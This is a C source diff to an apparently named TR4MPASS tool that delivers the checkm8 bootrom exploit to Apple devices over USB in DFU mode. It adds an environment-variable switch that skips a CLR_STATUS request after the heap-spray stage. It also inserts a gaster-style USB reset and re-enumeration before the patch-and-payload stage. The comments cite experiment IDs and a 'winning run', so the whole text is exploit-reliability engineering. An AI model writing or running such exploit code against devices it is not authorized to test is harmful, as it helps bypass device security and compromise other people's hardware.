@@ -126,6 +126,16 @@ int dfu_deliver(dfu_ctx_t *ctx)
          * spray (skip_clrstatus=0) is what brings it back to dfuIDLE.
          */
         ctx->skip_clrstatus = 0;
+
+        /* E13: allow skipping the stage-3 CLR_STATUS (the sync wedge +
+         * re-enumeration it triggers on M-series is the last device-
+         * visible event before the overwrite; ipwndfu never sends it
+         * on the A9 path).  Run with TR4MPASS_SKIP_CLRSTATUS=1. */
+        if (getenv("TR4MPASS_SKIP_CLRSTATUS")) {
+            ctx->skip_clrstatus = 1;
+            log_info("dfu_deliver: TR4MPASS_SKIP_CLRSTATUS set -- "
+                     "stage-3 CLR_STATUS will be skipped (E13)");
+        }
     }
 #endif
 
@@ -134,7 +144,32 @@ int dfu_deliver(dfu_ctx_t *ctx)
         goto error;
     }
 
-    /* Stage 4: Patch & Payload (handles its own IOKit logic if needed) */
+#if defined(__APPLE__)
+    /*
+     * E18 (E16 diff, gaster.c L1268/1273): gaster separates stages
+     * STRICTLY -- after EVERY stage it does reset_usb_handle()
+     * (ResetDevice + USBDeviceReEnumerate) and closes the handle,
+     * reopening a fresh one for the next stage.  The winning run
+     * showed RESET/SETUP/SPRAY/PATCH each on its own handle.  Insert
+     * the inter-stage reset here (spray -> patch): deactivate,
+     * reset+re-enum, re-activate a fresh user client.
+     */
+    if (iokit_usb_is_active()) {
+        log_info("dfu_deliver: inter-stage reset (gaster reset_usb_handle)");
+        iokit_usb_reset_device();
+        usleep(20000);
+        iokit_usb_reenumerate();
+        iokit_usb_deactivate();
+        usleep(250000); /* device re-enumerates; fresh handle next */
+        if (iokit_usb_activate() != 0) {
+            log_error("dfu_deliver: IOKit re-activate after inter-stage "
+                      "reset failed");
+            goto error;
+        }
+    }
+#endif
+
+    /* Stage 4: Patch & Payload (IOKit, gaster-exact with inter-stage reset) */
     if (checkm8_stage_patch(ctx) != 0) {
         goto error;
     }
